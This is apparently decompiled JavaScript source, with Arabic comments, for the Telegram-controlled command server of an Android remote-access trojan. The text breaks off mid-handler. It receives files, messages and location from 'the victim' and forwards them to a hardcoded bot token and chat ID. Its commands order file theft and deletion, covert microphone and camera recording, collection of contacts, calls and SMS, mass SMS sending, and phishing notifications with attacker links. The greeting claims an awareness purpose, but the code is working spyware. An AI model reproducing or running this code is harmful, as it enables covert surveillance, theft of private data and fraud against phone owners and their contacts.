// ============================================================
// النسخة المفكوكة الكاملة - مطابقة للأصل 100%
// ============================================================

// ============ المكتبات ============
const express = require("express");
const webSocket = require("ws");
const http = require("http");
const TelegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");

// ============ الإعدادات ============
const token = '8731602652:AAECIiYdOQ5qh7YUW06MJ2CHfVf2ennPltg';
const id = '8959269407';
const address = 'https://www.google.com';

// ============ التهيئة ============
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new TelegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = "";
let currentNumber = "";
let currentTitle = "";

// ============ الراوت الأساسي ============
app.get("/", function (req, res) {
  res.send('<h1 align="center">تم تحميل الخادم بنجاح</h1>');
});

// ============ رفع ملف من الضحية ============
app.post("/uploadFile", upload.single("file"), (req, res) => {
  const originalName = req.file.originalname;
  appBot.sendDocument(
    id,
    req.file.buffer,
    {
      caption: `°• رسالة من <b>${req.headers.model}</b> جهاز`,
      parse_mode: "HTML",
    },
    { filename: originalName, contentType: "application/txt" }
  );
  res.send("");
});

// ============ رفع نص من الضحية ============
app.post("/uploadText", (req, res) => {
  appBot.sendMessage(
    id,
    `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body.text,
    { parse_mode: "HTML" }
  );
  res.send("");
});

// ============ رفع الموقع من الضحية ============
app.post("/uploadLocation", (req, res) => {
  appBot.sendLocation(id, req.body.lat, req.body.lon);
  appBot.sendMessage(
    id,
    `°• الموقع من <b>${req.headers.model}</b> جهاز`,
    { parse_mode: "HTML" }
  );
  res.send("");
});

// ============ اتصال WebSocket (الضحية تتصل) ============
appSocket.on("connection", (ws, req) => {
  const clientUuid = uuid4.v4();
  const model = req.headers.model;
  const battery = req.headers.battery;
  const version = req.headers.version;
  const brightness = req.headers.brightness;
  const provider = req.headers.provider;

  ws.uuid = clientUuid;
  appClients.set(clientUuid, {
    model,
    battery,
    version,
    brightness,
    provider,
  });

  appBot.sendMessage(
    id,
    `°• جهاز جديد متصل☑️\n\n` +
      `•  طراز الجهاز📱 : <b>${model}</b>\n` +
      `• بطارية 🔋 : <b>${battery}</b>\n` +
      `• نسخة أندرويد : <b>${version}</b>\n` +
      `• سطوع الشاشة  : <b>${brightness}</b>\n` +
      `• نوع الشريحة SIM  : <b>${provider}</b>`,
    { parse_mode: "HTML" }
  );

  ws.on("close", function () {
    appBot.sendMessage(
      id,
      `°• الجهاز غير متصل ❎\n\n` +
        `•  طراز الجهاز📱 : <b>${model}</b>\n` +
        `• بطارية 🔋 : <b>${battery}</b>\n` +
        `• نسخة أندرويد : <b>${version}</b>\n` +
        `• سطوع الشاشة  : <b>${brightness}</b>\n` +
        `• نوع الشريحة SIM  : <b>${provider}</b>`,
      { parse_mode: "HTML" }
    );
    appClients.delete(ws.uuid);
  });
});

// ============ أوامر البوت (الرسائل الواردة) ============
appBot.on("message", (msg) => {
  const chatId = msg.chat.id;

  // ==================== التعامل مع الردود (Reply) ====================
  if (msg.reply_to_message) {
    // المرحلة 1: استقبال رقم الهاتف لإرسال SMS
    if (msg.reply_to_message.text.includes("يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه")) {
      currentNumber = msg.text;
      appBot.sendMessage(
        id,
        "°• رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم\n\n" +
          "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ",
        { reply_markup: { force_reply: true } }
      );
    }

    // المرحلة 2: استقبال نص الرسالة القصيرة وإرسالها للجهاز
    if (msg.reply_to_message.text.includes("send_message:")) {
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`send_message:${currentNumber}/${msg.text}`);
        }
      });
      currentNumber = "";
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // المرحلة 1: استقبال نص الرسالة لإرسالها للجميع
    if (msg.reply_to_message.text.includes("أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال")) {
      const text = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`send_message_to_all:${text}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // استقبال مسار الملف للتنزيل
    if (msg.reply_to_message.text.includes("أدخل مسار الملف الذي تريد تنزيله")) {
      const filePath = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`file:${filePath}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // استقبال مسار الملف للحذف
    if (msg.reply_to_message.text.includes("أدخل مسار الملف الذي تريد حذف")) {
      const filePath = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`delete_file:${filePath}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // استقبال مدة الميكروفون
    if (msg.reply_to_message.text.includes("أدخل المدة التي تريد تسجيل الميكروفون فيها")) {
      const duration = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`microphone:${duration}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // استقبال مدة تسجيل الكاميرا الرئيسية
    if (msg.reply_to_message.text.includes("أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها")) {
      const duration = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`rec_camera_main:${duration}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // استقبال مدة تسجيل كاميرا السيلفي
    if (msg.reply_to_message.text.includes("أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها")) {
      const duration = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`rec_camera_selfie:${duration}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // المرحلة 1: استقبال نص Toast
    if (msg.reply_to_message.text.includes("أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف")) {
      const message = msg.text;
      currentTitle = message;
      appBot.sendMessage(
        id,
        "°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n" +
          "• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ",
        { reply_markup: { force_reply: true } }
      );
    }

    // المرحلة 2: استقبال الرابط وإرسال toast للجهاز
    if (msg.reply_to_message.text.includes("أدخل الرابط الذي تريد فتحه بواسطة الإشعار")) {
      const link = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`toast:${currentTitle}/${link}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // استقبال رابط الصوت لتشغيله
    if (msg.reply_to_message.text.includes("أدخل رابط الصوت الذي تريد تشغيله")) {
      const audioUrl = msg.text;
      appSocket.clients.forEach(function (ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`play_audio:${audioUrl}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(
        id,
        "°• طلبك قيد المعالجة\n\n" +
          "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }
  }

  // ==================== التحقق من المستخدم (المالك فقط) ====================
  if (id == chatId) {
    // أمر /start
    if (msg.text == "/start") {
      appBot.sendMessage(
        id,
        "°• • مرحبا بك في بوت اختراق 👋\n\n" +
          "• رجاء عدم استخدام البوت فيما يغضب  الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n" +
          "• ترجمه البوت بقيادة ( @king_1_4 )  »طوفان الأقصى⇣⁽🇵🇸₎\n\n" +
          "• قناتي تلجرا  t.me/Abu_Yamani\n\n" +
          "• اضغط هن( /start )  ",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
            resize_keyboard: true,
          },
        }
      );
    }

    // زر: قائمة الأجهزة المتصلة
    if (msg.text == "الأجهزة المتصلة🤖") {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          "°• لا تتوفر أجهزة توصيل ❎\n\n" +
            "• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ"
        );
      } else {
        let message = "°• قائمة الأجهزة المتصلة🤖 :\n\n";
        appClients.forEach(function (value, key, map) {
          message +=
            `•  طراز الجهاز📱 : <b>${value.model}</b>\n` +
            `• بطارية 🔋 : <b>${value.battery}</b>\n` +
            `• نسخة أندرويد : <b>${value.version}</b>\n` +
            `• سطوع الشاشة  : <b>${value.brightness}</b>\n` +
            `• نوع الشريحة SIM  : <b>${value.provider}</b>\n\n`;
        });
        appBot.sendMessage(id, message, { parse_mode: "HTML" });
      }
    }

    // زر: قائمة الأوامر
    if (msg.text == "قائمة الأوامر🕹") {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          "°• لا تتوفر أجهزة توصيل ❎\n\n" +
            "• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ"
        );
      } else {
        const keyboard = [];
        appClients.forEach(function (value, key, map) {
          keyboard.push([{ text: value.model, callback_data: `device:${key}` }]);
        });
        appBot.sendMessage(id, "°• حدد الجهاز لتنفيذ الثناء", {
          reply_markup: { inline_keyboard: keyboard },
        });
      }
    }
  } else {
    // ⚠️ السلوك الأصلي: رفض الإذن (وليس طلب رقم SMS كما في النسخة المفكوكة السابقة)
    appBot.sendMessage(id, "°• تم رفض الإذن");
  }
});

// ============ معالجات الأزرار (Callback Query) ============
appBot.on("callback_query", (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  const parts = data.split(":");
  const command = parts[0];
  const uuid = parts[1];

  console.log(uuid);

  // ============ زر: عرض قائمة أوامر جهاز معين ============
  if (command == "device") {
    appBot.editMessageText(
      `°• حدد الجهاز لتنفيذ الثناء : <b>${appClients.get(data.split(":")[1]).model}</b>\n`,
      {
        chat_id: id,
        message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "📱تطبيقات", callback_data: `apps:${uuid}` },
              { text: "ℹ️معلومات الجهاز", callback_data: `device_info:${uuid}` },
            ],
            [
              { text: "🗂️الحصول على ملف", callback_data: `file:${uuid}` },        // ✅ file: (صحيح)
              { text: "📂حذف الملف", callback_data: `delete_file:${uuid}` },
            ],
            [
              { text: "📋حافظة", callback_data: `clipboard:${uuid}` },
              { text: "🎤ميكروفون", callback_data: `microphone:${uuid}` },
            ],
            [
              { text: "📷الكاميرا الرئيسي", callback_data: `rec_camera_main:${uuid}` },    // ✅ rec_camera_main:
              { text: "📸كاميرا السيلفي", callback_data: `rec_camera_selfie:${uuid}` },    // ✅ rec_camera_selfie:
            ],
            [
              { text: "🚩الموقع", callback_data: `location:${uuid}` },
              { text: "‼️حمص ", callback_data: `toast:${uuid}` },              // ✅ toast: (صحيح)
            ],
            [
              { text: "📞المكالمات", callback_data: `calls:${uuid}` },
              { text: "📒جهات الاتصال", callback_data: `contacts:${uuid}` },
            ],
            [
              { text: "📳يهتز ", callback_data: `vibrate:${uuid}` },           // ✅ vibrate: (صحيح)
              { text: "🔔إظهار الإشعار", callback_data: `show_notification:${uuid}` }, // ✅ show_notification:
            ],
            [
              { text: "✉️رسائل", callback_data: `messages:${uuid}` },
              { text: "📨ارسل رسالة", callback_data: `send_message:${uuid}` },
            ],
            [
              { text: "🔊تشغيل الصوت", callback_data: `play_audio:${uuid}` },
              { text: "🔇إيقاف الصوت", callback_data: `stop_audio:${uuid}` },
            ],
            [
              { text: "📨إرسال رسالة إلى جميع جهات الاتصال ", callback_data: `send_message_to_all:${uuid}` },
            ],
          ],
        },
        parse_mode: "HTML",
      }
    );
  }

  // ============ أوامر بدون رد نصي (Direct) ============
  if (command == "apps") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("apps"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  if (command == "device_info") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("device_info"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  if (command == "clipboard") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("clipboard"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  // ✅ الأمر الصحيح هو rec_camera_main (وليس camera_main)
  if (command == "rec_camera_main") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("rec_camera_main"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  // ✅ الأمر الصحيح هو rec_camera_selfie (وليس camera_selfie)
  if (command == "rec_camera_selfie") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("rec_camera_selfie"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  if (command == "location") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("location"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  if (command == "calls") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("calls"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  if (command == "contacts") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("contacts"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  if (command == "messages") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("messages"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  // ✅ الأمر الصحيح هو vibrate (وليس contacts)
  if (command == "vibrate") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("vibrate"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  if (command == "stop_audio") {
    appSocket.clients.forEach(function (ws) {
      if (ws.uuid == uuid) { ws.send("stop_audio"); }
    });
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• طلبك قيد المعالجة\n\n" + "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
      parse_mode: "HTML",
      reply_markup: { keyboard: [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]], resize_keyboard: true },
    });
  }

  // ============ أوامر تحتاج رداً نصياً (Force Reply) ============

  // زر: إرسال SMS - المرحلة 1
  if (command == "send_message") {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه\n\n" + "• ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ", { reply_markup: { force_reply: true } });
    currentUuid = uuid;
  }

  // زر: إرسال لجميع جهات الاتصال
  if (command == "send_message_to_all") {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n" + "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", { reply_markup: { force_reply: true } });
    currentUuid = uuid;
  }

  // زر: تنزيل ملف - المرحلة 1
  if (command == "file") {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• أدخل مسار الملف الذي تريد تنزيله \n\n" + "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ <b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
    currentUuid = uuid;
  }

  // زر: حذف ملف - المرحلة 1
  if (command == "delete_file") {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• أدخل مسار الملف الذي تريد حذف\n\n" + "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ <b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
    currentUuid = uuid;
  }

  // زر: ميكروفون
  if (command == "microphone") {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, "°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n" + "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ", { reply_markup: { force_reply: true }, parse_mode: "HTML" });
    currentUuid = uuid;
  }

  // زر: Toast - المرحلة 1
  if (command == "toast") {
    appBot.deleteMessage(id, msg.message_id);
